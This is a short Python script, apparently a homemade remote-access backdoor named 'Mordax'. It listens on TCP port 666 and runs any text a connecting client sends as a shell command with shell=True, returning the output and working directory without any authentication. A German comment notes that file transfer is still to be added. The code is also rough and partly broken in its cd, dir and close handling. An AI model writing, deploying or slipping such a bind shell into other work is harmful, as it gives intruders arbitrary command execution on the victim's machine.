import socket
import subprocess
import os
import sys
host = ""
port = 666
import threading

 #Unbedingt weiter machen, file trans

class Mordax():
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((host, port))
        self.s.listen(3)

    def start(self):
        self.connection, self.addr = self.s.accept()
        if self.connection and self.addr:
            connect = threading.Thread(target=self.server)
            connect.start()
            self.start()

    def server(self):

        print(self.addr[0])

        while True:

            try:
                data = self.connection.recv(2048)
                if data[:2] == "cd":
                    path = data[3:]
                    try:
                        os.chdir(data[3:])
                    except Exception:
                        mmm = 1

                if data[3:] == "dir":
                    os.listdir(path)

                if len(data) > 0:
                    if data == "close":
                        print("close")
                        self.s.close()
                        self.connection.close()
                        self.server()
                    cmd = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout = cmd.stdout.read() + cmd.stderr.read() + ";" + os.getcwd()
                    size = sys.getsizeof(stdout)
                    if size > 2048:
                        size = sys.getsizeof(stdout)
                        size = str(size)
                        self.connection.send("SIZE" + "; " + size)
                        self.connection.send(stdout)
                    else:
                        self.connection.send(stdout)
            except socket.error as error:
                self.connection.close()
                self.connection, addr = self.s.accept()
                print(addr)



Server = Mordax()
Server.start()